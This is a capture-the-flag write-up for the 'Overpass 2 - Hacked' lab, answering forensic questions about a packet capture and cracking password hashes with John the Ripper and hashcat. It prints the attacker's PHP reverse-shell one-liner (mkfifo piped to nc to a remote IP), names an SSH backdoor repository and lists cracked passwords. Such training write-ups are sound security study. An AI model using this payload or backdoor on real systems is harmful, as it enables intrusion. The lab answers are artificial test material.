# Overpass 2 - Hacked

# Forensic - Analyse the PCAP
~~~
Task 1
1. What was the URL of the page they used to upload a reverse shell? /development/
2. What payload did the attacker use to gain access? <?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
3. What password did the attacker use to privesc? whenevernoteartinstant
4. How did the attacker establish persistence? clone https://github.com/NinjaJc01/ssh-backdoor
5. Using the fasttrack wordlist, how many of the system passwords were crackable? 4
~~~

# Research - Analsye the code
~~~
Task 2
1. What's the default hash for the backdoor? bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3
2. What's the hardcoded salt for the backdoor? 1c362db832f3f864c8c2fe05f2002a05
3. What was the hash that the attacker used? - go back to the PCAP for this! 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
4.Crack the hash using rockyou and a cracking tool of your choice. What's the password? november16
~~~

# Attack - Get back in!
~~~
Task 3
1. The attacker defaced the website. What message did they leave as a heading?
2. Using the information you've found previously, hack your way back in!
3. What's the user flag?
4. What's the root flag?
~~~

# Analyse the PCAP
~~~
Look for a HTTP packet with POST request to see what was the page that was used to upload a reverse shell. Right-click on the HTTP packet, then click Follow, then HTTP stream;


Next is to look for TCP packet with PSH, ACK flags as they are signs of more data getting transmitted, so mostly a sign of persistence for me. Right-click on the packet you think is interesting and choose Follow, and then TCP Stream:


 On the same TCP Stream, we can see the list of users through the /etc/shadow with their hashed passwords. First, put the entries you found from /etc/shadow to a file and use John the Ripper to crack the hashed passwords. Type sudo john –wordlist=/usr/share/wordlists/fasttrack.txt >found.txt

john shadow.txt --wordlist=/usr/share/wordlists/fasttrack.txt > found.txt


cat found.txt
Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
secret12         (bee)     
abcd123          (szymex)     
1qaz2wsx         (muirland)     
secuirty3        (paradox)     

The next two questions can be answered by analyzing the script that was used for the persistent connection.

Next, we have to analyze which hash was used in conjunction with the hard-coded salt to retrieve our target password. There are only two hashes to choose from, and unluckily. So, I put one of the hashes and the salt together in a $pass:$salt format. And used a hash analyzer, I was able to identify that it was using SHA512 algorithm.

With the knowledge that the password was hashed using SHA512 algorithm, and it was salted, and uses the $pass:$salt format, I visited hash examples to check what hash mode I have to use when using Hashcat to crack it

results : 1710 - sha512($pass.$salt)

hashcat -m 1710 -o results.txt hash2.txt /usr/share/wordlists/rockyou.txt


~~~